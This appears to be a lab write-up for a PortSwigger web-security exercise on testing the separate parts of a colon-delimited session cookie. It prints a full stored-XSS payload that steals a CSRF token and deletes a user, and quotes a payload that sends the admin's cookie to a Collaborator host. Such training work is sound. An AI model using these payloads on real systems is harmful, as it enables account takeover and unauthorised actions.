# Scanning non-standard data structures

**Category:** Essential Skills
**Difficulty:** PRACTITIONER
**Lab:** https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-scanning-non-standard-data-structures

Automated scanners are good at testing a parameter as a single opaque value — but plenty of real parameters aren't single values at all, they're two or three distinct pieces of data glued together with a delimiter. A scanner that treats the whole thing as one insertion point will walk straight past a vulnerability living in just one sub-component. This lab is built around noticing that structure before testing it.

## The Target

The session cookie set after login has the form `username:token` — for example `wiener:rSPDgZqoKBlbi7UMLSM9ENyhWTwPbCBy` — with the cleartext username and an opaque token separated by a colon. The cookie carries integrity protection: hand-editing it wholesale produces a `500 Integrity violation detected` error.

## The Investigation

A `500` on tampering looks like a dead end — the obvious read is "this cookie is protected, move on." But the integrity check is validating the *whole* cookie value; that says nothing about what the server does with the individual sub-values *before* that validation completes. Testing the username portion and the token portion as two separate insertion points, rather than the cookie as one indivisible blob, is exactly the "non-standard data structure" this lab is named for — a compound parameter needs each of its parts probed independently, because a scanner (or a tester) that only mutates the whole value will never isolate which half actually matters.

Injecting a payload into just the username sub-value while leaving the token untouched confirmed the theory: the request still 500s on the integrity check, but the *server stores the submitted username value before that validation runs* — meaning it becomes visible anywhere admin tooling surfaces active session/user data, regardless of whether the request that set it was ultimately rejected.

## The Exploit

We set the cookie's username sub-value to a stored XSS payload, keeping the real token intact so the compound structure still parsed as expected up to the validation step:

```
<img src=x onerror="fetch('/admin').then(r=>r.text()).then(h=>{
  let m=h.match(/csrf.*?value=.([^&'\"]+)/);
  fetch('/admin/delete?username=carlos',{
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf='+m[1]
  })
})">
```

Once an admin's session touches whatever view surfaces stored usernames, the payload fires in their browser: it fetches `/admin`, regex-extracts the CSRF token straight out of that page's HTML, and immediately POSTs a `carlos`-deletion request using the admin's own authenticated session and that harvested token. No Collaborator interaction and no exploit server were needed anywhere in this chain — the payload doesn't exfiltrate anything, it just performs the admin action directly and in-band, using the admin's own browser as the actor.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution starts from the identical structural insight — select just the cleartext `wiener` portion of the cookie in Burp's Proxy history and run **Scan selected insertion point** against that sub-value alone, which is precisely the "test each half separately" idea above, just executed through Burp Scanner's UI instead of a manual probe. Their scan surfaces the same stored-XSS condition via a Collaborator interaction.

Where the two approaches diverge is everything downstream of detection. PortSwigger's exploit is a two-stage exfiltration: an SVG payload (`'"><svg/onload=fetch(`//COLLABORATOR/${encodeURIComponent(document.cookie)}`)>`) sends the admin's raw session cookie to a Collaborator-controlled domain, then that stolen cookie is manually pasted into the tester's own browser via DevTools to load the admin panel and delete `carlos` as a second, separate step. Our payload skips the exfiltration step entirely — instead of stealing the admin's cookie so *we* can act as them afterward, the injected script performs the CSRF-token-fetch-and-delete sequence *from inside the admin's own already-authenticated browser*, finishing the objective in one shot with no cookie ever leaving the victim's session. Both are valid stored-XSS-to-admin-action chains; ours trades the visibility of a Collaborator interaction log for not needing Collaborator infrastructure at all.

## What This Teaches Us

This lab's real subject is testing methodology, not the XSS mechanics — a colon-delimited cookie value is a small, easy-to-miss example of a broader pattern: composite parameters (JSON blobs inside a single form field, delimiter-packed tokens, serialized structures) hide vulnerabilities from any process, automated or manual, that only ever mutates the parameter as a whole. And the integrity check's `500` response is a reminder that a validation failure tells you a check *ran*, not that everything upstream of it was safe — server-side storage and other side effects can still happen before that check has a chance to reject anything.
